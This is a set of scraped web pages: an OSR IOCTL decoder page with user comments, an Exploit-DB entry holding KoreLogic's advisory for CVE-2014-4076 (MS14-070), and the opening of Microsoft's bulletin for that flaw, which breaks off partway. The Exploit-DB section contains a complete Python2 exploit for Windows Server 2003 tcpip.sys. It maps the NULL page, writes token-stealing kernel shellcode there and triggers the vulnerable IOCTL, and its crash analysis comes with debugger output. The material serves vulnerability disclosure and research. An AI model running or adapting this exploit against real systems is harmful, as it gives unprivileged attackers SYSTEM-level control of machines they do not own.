| | | |  | **Thu, 14 Mar 2019**     **118020 members**  [Login](login.cfm.htm)    [Join](custom.cfm%5Ename%3Dlogin_joinok.cfm.htm) |  | | --- | --- | --- | |  | Contents |  |  | [**Online Dump Analyzer**](page.cfm%5Ename%3DAnalyze.htm) [**OSR Dev Blog**](section.cfm%5Esection%3D16.htm) [**The NT Insider**](section.cfm%5Esection%3D17.htm) [**The Basics**](section.cfm%5Esection%3D26.htm) [**File Systems**](section.cfm%5Esection%3D20.htm) [**Downloads**](section.cfm%5Esection%3D27.htm) [**ListServer / Forum**](page.cfm%5Ename%3DListServer.htm) | | --- | --- |  |  | | --- | |  | **Express Links** |  |  | **·** | [The NT Insider Digital Edition - May-June 2016 Now Available!](article.cfm%5Eid%3D632.htm) | | --- | --- | --- | |  | **·** | [Windows 8.1 Update: VS Express Now Supported](article.cfm%5Eid%3D620.htm) | |  | **·** | [HCK Client install on Windows N versions](article.cfm%5Eid%3D619.htm) | |  | **·** | [There's a WDFSTRING?](article.cfm%5Eid%3D618.htm) | |  | **·** | [When CAN You Call WdfIoQueueP...ously](article.cfm%5Eid%3D614.htm) | |  | | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |     |  | | | --- | --- | | [DOWNLOADS](section.cfm%5Eid%3D27.htm) | | | | **OSR Online IOCTL Decoder**    | **Enter the IOCTL value to decode in the box below**IOCTL VALUE (hex)  **That IOCTL decodes to:**Device:   Function: Access:   Method: | | --- |   **User Comments** Rate this utility and tell the community how well you like it. Is it a worthwhile download? Does it work as described?? Does it help you in your job as a driver writer or tester?  [Click Here To Post Your Comment](articleCommentPost.cfm%5Eid%3D229.htm#comments)        **"Incorrect device type?"**   Use 65535 (0xFFFF) as device type, e.g. 0xffff2020 Tool shows: 0xfff  22-Oct-09, Gary Scheitlin  ---    **"Update to IOCTL decoder"**   It would be nice (and very simple) to update your decoder. Just increase the array size and append these entries to it : device[55]="SERENUM" device[56]="TERMSRV" device[57]="KSEC" device[58]="FIPS" device[59]="INFINIBAND" device[60]="0x3C\_not\_used" device[61]="0x3D\_not\_used" device[62]="VMBUS" device[63]="CRYPT\_PROVIDER" device[64]="WPD" device[65]="BLUETOOTH" device[66]="MT\_COMPOSITE" device[67]="MT\_TRANSPORT" device[68]="BIOMETRIC" device[69]="PMI" Regards, Peter  *Rating:*       08-Feb-09, Peter Hodges  ---    **"RE: Wrong calculation!"**   Bug has been fixed, thanks for the pickup! -scott  30-Mar-06, Scott Noone  ---    **"Downloadable"**    Can't believe you guys complainng about it not being downloadable. A quick "View source" in IE will show you exactly the source code. Cut and paste into your own HTML document, and you'll never need to access it online. \*AND\* you can fix/enhance it to help you to decode those "difficult" IOCTLs....   *Rating:*       11-Nov-04, Paul Bunn  ---    **"Re: Where is the download link?"**   The IOTL decoder is not a downloadable utility...for online use only.   09-Sep-04, Daniel Root  ---    **"Misspelling"**   METHOUD\_OUT\_DIRECT? Who spelled this? Hector? Sheesh...   *Rating:*        03-Dec-03, Tony Mason  ---    **"IOCTL Decoder utility comments"**   First of all, this is a great utility. Now I have some comments about it: 1) You guys should make it downloadable. I want to use it on systems that don't have access to the internet and therefore it would be great to be able to use some windows app that would do it. 2) It doesn't seem to work properly for IOCTL\_SCSI\_PASS\_THROUGH. I used it and it came back with some HEX function code rather than saying IOCTL\_SCSI\_PASS\_THROUGH, so can you please look into that. 3) I was using it to figure out what IOCTL code does the CD class driver get when an IMAPI burning operation starts up. The IOCTL code that I get is weird... in the sense that it is longer than normal IOCTL codes. The debugger tells me that the code is 0x90dae040 and usually codes for IOCTLS are like something like 0x4d004 4) Can there be a reverse app, meaning we enter an IOCTL name like IOCTL\_SCSI\_PASS\_THROUGH and it just goes ahead and tells us the hex meaning of that IOCTL code? Thanks, Satyeshwar  *Rating:*       29-Aug-03, Satyeshwar Singh  --- | |  | [Post Your Comments.](articleCommentPost.cfm%5Eid%3D229.htm#comments) | | --- | --- | | | --- | --- | --- | --- | --- | | | | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | | bottom nav links | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |



=== Content from www.exploit-db.com_58193412_20250126_010409.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Microsoft Windows Server 2003 SP2 - Local Privilege Escalation (MS14-070)

#### EDB-ID:

###### 35936

#### CVE:

###### [2014-4076](https://nvd.nist.gov/vuln/detail/CVE-2014-4076)

---

**EDB Verified:**

#### Author:

###### [KoreLogic](/?author=7433)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2015-01-29

---

**Vulnerable App:**

```
"""
KL-001-2015-001 : Microsoft Windows Server 2003 SP2 Arbitrary Write Privilege Escalation

Title: Microsoft Windows Server 2003 SP2 Arbitrary Write Privilege Escalation
Advisory ID: KL-001-2015-001
Publication Date: 2015.01.28
Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2015-001.txt

1. Vulnerability Details

     Affected Vendor: Microsoft
     Affected Product: TCP/IP Protocol Driver
     Affected Version: 5.2.3790.4573
     Platform: Microsoft Windows Server 2003 Service Pack 2
     Architecture: x86, x64, Itanium
     Impact: Privilege Escalation
     Attack vector: IOCTL
     CVE-ID: CVE-2014-4076

2. Vulnerability Description

     The tcpip.sys driver fails to sufficiently validate memory
     objects used during the processing of a user-provided IOCTL.

3. Technical Description

     By crafting an input buffer that will be passed to the Tcp
     device through the NtDeviceIoControlFile() function, it
     is possible to trigger a vulnerability that would allow an
     attacker to elevate privileges.

     This vulnerability was discovered while fuzzing the tcpip.sys
     driver. A collection of IOCTLs that could be targeted was
     obtained and subsequently fuzzed. During this process, one of
     the crashes obtained originated from the IOCTL 0x00120028.
     This was performed on an x86 installation of Windows Server
     2003, Service Pack 2.

     ErrCode = 00000000
     eax=00000000 ebx=859ef888 ecx=00000008 edx=00000100 esi=00000000 edi=80a58270
     eip=f67ebbbd esp=f620a9c8 ebp=f620a9dc iopl=0         nv up ei pl zr na pe nc
     cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
     tcpip!SetAddrOptions+0x1d:
     f67ebbbd 8b5e28          mov     ebx,dword ptr [esi+28h] ds:0023:00000028=????????

     A second chance exception has occurred during a mov
     instruction. This instruction is attempting to copy a pointer
     value from an un-allocated address space. Since no pointer
     can be found, an exception is generated.

     Let's begin by reviewing the call stack:

     kd> kv
     *** Stack trace for last set context - .thread/.cxr resets it
     ChildEBP RetAddr  Args to Child
     f620a9dc f67e416b f620aa34 00000022 00000004 tcpip!SetAddrOptions+0x1d (FPO: [Non-Fpo])
     f620aa10 f67e40de f620aa34 859ef888 859ef8a0 tcpip!TdiSetInformationEx+0x539 (FPO: [Non-Fpo])
     f620aa44 f67e3b24 85a733d0 85a73440 85a73440 tcpip!TCPSetInformationEx+0x8c (FPO: [Non-Fpo])
     f620aa60 f67e3b51 85a733d0 85a73440 85a733d0 tcpip!TCPDispatchDeviceControl+0x149 (FPO: [Non-Fpo])
     f620aa98 8081d7d3 85c4b410 85a733d0 85e82390 tcpip!TCPDispatch+0xf9 (FPO: [Non-Fpo])
     f620aaac 808ef85d 85a73440 85e82390 85a733d0 nt!IofCallDriver+0x45 (FPO: [Non-Fpo])
     f620aac0 808f05ff 85c4b410 85a733d0 85e82390 nt!IopSynchronousServiceTail+0x10b (FPO: [Non-Fpo])
     f620ab5c 808e912e 000006f4 00000000 00000000 nt!IopXxxControlFile+0x5e5 (FPO: [Non-Fpo])
     f620ab90 f55c10fa 000006f4 00000000 00000000 nt!NtDeviceIoControlFile+0x2a (FPO: [Non-Fpo])

     The nt!NtDeviceIoControlFile() function was called, creating
     a chain of subsequent function calls that eventually led to
     the tcpip!SetAddrOptions() function being called.

     By de-constructing the call to nt!NtDeviceIoControlFile() we
     can derive all required information to re-create this exception.

     0a b940dd34 80885614 nt!NtDeviceIoControlFile+0x2a
     eax=00000000 ebx=8c785070 ecx=00000000 edx=00000000 esi=00000000 edi=00000000
     eip=808e912e esp=b940dd08 ebp=b940dd34 iopl=0         nv up ei pl zr na pe nc
     cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
     nt!NtDeviceIoControlFile+0x2a:
     808e912e 5d              pop     ebp
     kd> db [ebp+2C] L?0x4
     b940dd60  00 00 00 00                                      ....
     kd> db [ebp+28] L?0x4
     b940dd5c  00 00 00 00                                      ....
     kd> db [ebp+24] L?0x4
     b940dd58  20 00 00 00                                       ...
     kd> db [ebp+20] L?0x4
     b940dd54  00 11 00 00                                      ....
     kd> db [ebp+1c] L?0x4
     b940dd50  28 00 12 00                                      (...
     kd> db [ebp+18] L?0x4
     b940dd4c  58 4f bd 00                                      XO..
     kd> db [ebp+14] L?0x4
     b940dd48  00 00 00 00                                      ....
     kd> db [ebp+10] L?0x4
     b940dd44  00 00 00 00                                      ....
     kd> db [ebp+0c] L?0x4
     b940dd40  00 00 00 00                                      ....
     kd> db [ebp+8] L?0x4
     b940dd3c  b8 06 00 00                                      ....

     The inputBuffer for this call references memory at 0x1000 with
     a length of 0x20.

     kd> db 0x1100 L?0x20
     00001100  00 04 00 00 00 00 00 00-00 02 00 00 00 02 00 00  ................
     00001110  22 00 00 00 04 00 00 00-00 00 01 00 00 00 00 00  "...............

     After review of the tcpip.sys driver, some memory trickery
     was created to control the code flow until the instruction
     pointer could be controlled in a way that would be beneficial
     to an attacker.

     kd> db 0x28 L?0x11
     00000028  87 ff ff 38 00 00 00 00-00 00 00 00 00 00 00 00  ...8............
     00000038  01

     eax=00000000 ebx=80a58290 ecx=00000000 edx=00000000 esi=00000000 edi=00000000
     eip=0000002a esp=b940db3c ebp=b940db60 iopl=0         nv up ei pl zr na pe nc
     cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
     0000002a ff              ???

     Since the instruction pointer now contains 0x0000002a,
     exploitation becomes trivial. Merely allocating the desired
     payload for execution at this memory address will allow for
     unprivileged users to run their payload within a privileged
     process.

4. Mitigation and Remediation Recommendation

     The vendor has issued a patch for this
     vulnerability, the details of which are presented
     in the vendor's public acknowledgment MS14-070
     (https://technet.microsoft.com/library/security/MS14-070).

5. Credit

     This vulnerability was discovered by Matt Bergin of KoreLogic
     Security, Inc.

6. Disclosure Timeline

     2014.04.28 - Initial contact; sent Microsoft report and PoC.
     2014.04.28 - Microsoft requests PoC.
     2014.04.29 - KoreLogic resends PoC from the initial contact
                  email.
     2014.04.29 - Microsoft acknowledges receipt of vulnerability
                  report.
     2014.04.29 - Microsoft opens case 19010 (MSRC 0050929) to
                  investigate the vulnerability.
     2014.04.30 - Microsoft informs KoreLogic that the case is
                  actively being investigated.
     2014.05.30 - Microsoft informs KoreLogic that the case is
                  actively being investigated.
     2014.06.11 - KoreLogic informs Microsoft that 30 business days
                  have passed since vendor acknowledgment of the
                  initial report. KoreLogic requests CVE number for
                  the vulnerability, if there is one. KoreLogic
                  also requests vendor's public identifier for the
                  vulnerability along with the expected disclosure
                  date.
     2014.06.24 - KoreLogic informs Microsoft that no response was
                  received following the 06.11.14 email. KoreLogic
                  requests CVE number for the vulnerability, if
                  there is one. KoreLogic also requests vendor's
                  public identifier for the vulnerability along with
                  the expected disclosure date.
     2014.06.24 - Microsoft replies to KoreLogic that they have
                  reproduced the vulnerability and are determining
                  how to proceed with the supplied information.
                  They are not able to provide a CVE or an expected
                  disclosure date.
     2014.07.02 - 45 business days have elapsed since Microsoft
                  acknowledged receipt of the vulnerability report
                  and PoC.
     2014.07.17 - KoreLogic requests CVE number for the
                  vulnerability. KoreLogic also requests vendor's
                  public identifier for the vulnerability along with
                  the expected disclosure date.
     2014.08.18 - Microsoft notifies KoreLogic that they have a CVE
                  but are not willing to share it with KoreLogic at
                  this time.
     2014.09.08 - KoreLogic requests CVE number for the
                  vulnerability. KoreLogic also requests vendor's
                  public identifier for the vulnerability along with
                  the expected disclosure date.
     2014.09.11 - Microsoft responds saying that the vulnerability
                  is expected to be disclosed in "a Fall release"
                  and that "it is currently looking good for
                  October." Does not provide CVE.
     2014.09.24 - Microsoft informs KoreLogic that there was a
                  packaging issue and that the patch will be pushed
                  to November.
     2014.11.03 - Microsoft confirms the patch will ship in November.
     2014.11.11 - Vulnerability publicly disclosed by Microsoft as
                  issue MS14-070 with CVE-2014-4076.
     2015.01.28 - KoreLogic releases advisory.

7. Exploit
"""

     #!/usr/bin/python2
     #
     # KL-001-2015-001 / MS14-070 / CVE-2014-4076
     # Microsoft Windows Server 2003 x86 Tcpip.sys Privilege Escalation
     # Matt Bergin @ KoreLogic / Level @ Smash the Stack
     # shout out to bla
     #

     from optparse import OptionParser
     from subprocess import Popen
     from os.path import exists
     from struct import pack
     from time import sleep
     from ctypes import *
     from sys import exit

     CreateFileA,NtAllocateVirtualMemory,WriteProcessMemory =
windll.kernel32.CreateFileA,windll.ntdll.NtAllocateVirtualMemory,windll.kernel32.WriteProcessMemory
     DeviceIoControlFile,CloseHandle = windll.ntdll.ZwDeviceIoControlFile,windll.kernel32.CloseHandle
     INVALID_HANDLE_VALUE,FILE_SHARE_READ,FILE_SHARE_WRITE,OPEN_EXISTING,NULL = -1,2,1,3,0

     def spawn_process(path):
         process = Popen([path],shell=True)
         pid = process.pid
         return

     def main():
         print "CVE-2014-4076 x86 exploit, Level\n"
         global pid, process
         parser = OptionParser()
         parser.add_option("--path",dest="path",help="path of process to start and elevate")
         parser.add_option("--pid",dest="pid",help="pid of running process to elevate")
         o,a = parser.parse_args()
         if (o.path == None and o.pid == None):
             print "[!] no path or pid set"
             exit(1)
         else:
             if (o.path != None):
           if (exists(o.path) != True):
         print "[!] path does not exist"
         exit(1)
           else:
                   Thread(target=spawn_process,args=(o.path),name='attacker-cmd').start()
             if (o.pid != None):
                 try:
                     pid = int(o.pid)
                 except:
                     print "[!] could not convert PID to an interger."
                     exit(1)
         while True:
                 if ("pid" not in globals()):
                     sleep(1)
                 else:
                     print "[+] caught attacker cmd at %s, elevating now" % (pid)
                     break
         buf =
"\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x22\x00\x00\x00\x04\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00"
         sc =
"\x60\x64\xA1\x24\x01\x00\x00\x8B\x40\x38\x50\xBB\x04\x00\x00\x00\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00\x00\x75\xED\x8B\xB8\xD8\x00\x00\x00\x83\xE7\xF8\x58\xBB\x41\x41\x41\x41\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00\x00\x75\xED\x89\xB8\xD8\x00\x00\x00\x61\xBA\x11\x11\x11\x11\xB9\x22\x22\x22\x22\xB8\x3B\x00\x00\x00\x8E\xE0\x0F\x35\x00"
         sc = sc.replace("\x41\x41\x41\x41",pack('<L',pid))
         sc = sc.replace("\x11\x11\x11\x11","\x39\xff\xa2\xba")
         sc = sc.replace("\x22\x22\x22\x22","\x00\x00\x00\x00")
         handle = CreateFileA("\\\\.\\Tcp",FILE_SHARE_WRITE|FILE_SHARE_READ,0,None,OPEN_EXISTING,0,None)
         if (handle == -1):
             print "[!] could not open handle into the Tcp device"
             exit(1)
         print "[+] allocating memory"
         ret_one = NtAllocateVirtualMemory(-1,byref(c_int(0x1000)),0x0,byref(c_int(0x4000)),0x1000|0x2000,0x40)
         if (ret_one != 0):
             print "[!] could not allocate memory..."
             exit(1)
         print "[+] writing relevant memory..."
         ret_two = WriteProcessMemory(-1, 0x28, "\x87\xff\xff\x38", 4, byref(c_int(0)))
         ret_three = WriteProcessMemory(-1, 0x38, "\x00"*2, 2, byref(c_int(0)))
         ret_four = WriteProcessMemory(-1, 0x1100, buf, len(buf), byref(c_int(0)))
         ret_five = WriteProcessMemory(-1, 0x2b, "\x00"*2, 2, byref(c_int(0)))
         ret_six = WriteProcessMemory(-1, 0x2000, sc, len(sc), byref(c_int(0)))
         print "[+] attack setup done, crane kick!"
         DeviceIoControlFile(handle,NULL,NULL,NULL,byref(c_ulong(8)),0x00120028,0x1100,len(buf),0x0,0x0)
         CloseHandle(handle)
         exit(0)

     if __name__=="__main__":
         main()

"""
The contents of this advisory are copyright(c) 2015
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v1.0.txt
"""

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from docs.microsoft.com_7cc93e69_20250124_121442.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityBulletins/2014/ms14-070.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

# Microsoft Security Bulletin MS14-070 - Important

* Article
* 03/01/2023
* 5 contributors

Feedback

## In this article

## Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935)

Published: November 11, 2014

**Version:** 1.0

## Executive Summary

This security update resolves a publically reported vulnerability in TCP/IP that occurs during input/output control ([IOCTL](https://technet.microsoft.com/library/security/dn848375.aspx)) processing.\*\*\*\*This vulnerability could allow elevation of privilege if an attacker logs on to a system and runs a specially crafted application. An attacker who successfully exploited this vulnerability could run arbitrary code in the context of another process. If this process runs with administrator privileges, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

This security update is rated Important for all supported editions of Windows Server 2003. For more information, see the **Affected Software** section.

The security update addresses the vulnerability by correcting how the Windows TCP/IP stack handles objects in memory during IOCTL processing. For more information about the vulnerabilities, see the **Frequently Asked Questions (FAQ)** subsection for the specific vulnerability.

For more information about this document, see [Microsoft Knowledge Base Article 2989935](https://support.microsoft.com/kb/2989935).

## Affected Software

The following software has been tested to determine which versions or editions are affected. Other versions or editions either are past their support life cycle or are not affected. To determine the support life cycle for your software version or edition, see [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

| **Operating System** | **Maximum Security Impact** | **Aggregate Severity Rating** | **Updates Replaced** |
| --- | --- | --- | --- |
| **Windows Server 2003** |  |  |  |
| [Windows Server 2003 Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=ccb45a29-edd8-40ce-b71a-85ebbee91141) (2989935) | Elevation of Privilege | Important | 967723 in [MS09-048](https://go.microsoft.com/fwlink/?linkid=155978) |
| [Windows Server 2003 x64 Edition Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=521de792-862f-43cb-80ac-29b9b07008e8) (2989935) | Elevation of Privilege | Important | 967723 in [MS09-048](https://go.microsoft.com/fwlink/?linkid=155978) |
| [Windows Server 2003 with SP2 for Itanium-based Systems](https://www.microsoft.com/download/details.aspx?familyid=03e80c93-287f-4ec8-af0f-06013d1a561b) (2989935) | Elevation of Privilege | Important | 967723 in [MS09-048](https://go.microsoft.com/fwlink/?linkid=155978) |

## Severity Ratings and Vulnerability Identifiers

The following severity ratings assume the potential maximum impact of the vulnerability. For information regarding the likelihood, within 30 days of this security bulletin's release, of the exploitability of the vulnerability in relation to its severity rating and security impact, please see the Exploitability Index in the [November bulletin summary](https://technet.microsoft.com/library/security/ms14-nov).

| **Affected Software** | [**TCP/IP Elevation of Privilege Vulnerability - CVE-2014-4076**](https://www.cve.org/CVERecord?id=CVE-2014-4076) | **Aggregate Severity Rating** |
| --- | --- | --- |
| **Windows Server 2003** |  |  |
| Windows Server 2003 Service Pack 2 | **Important** \ Elevation of Privilege | **Important** |
| Windows Server 2003 x64 Edition Service Pack 2 | **Important** \ Elevation of Privilege | **Important** |
| Windows Server 2003 with SP2 for Itanium-based Systems | **Important** \ Elevation of Privilege | **Important** |

## TCP/IP Elevation of Privilege Vulnerability - CVE-2014-4076

An elevation of privilege vulnerability exists in the Windows TCP/IP stack (tcpip.sys, tcpip6.sys) that is caused when the Windows TCP/IP stack fails to properly handle objects in memory during IOCTL processing. This vulnerability has been publicly disclosed. When this security bulletin was issued,\*\*\*\*Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers. The update addresses the vulnerability by modifying the way that the Windows TCP/IP stack handles objects in memory during IOCTL processing.

### Mitigating Factors

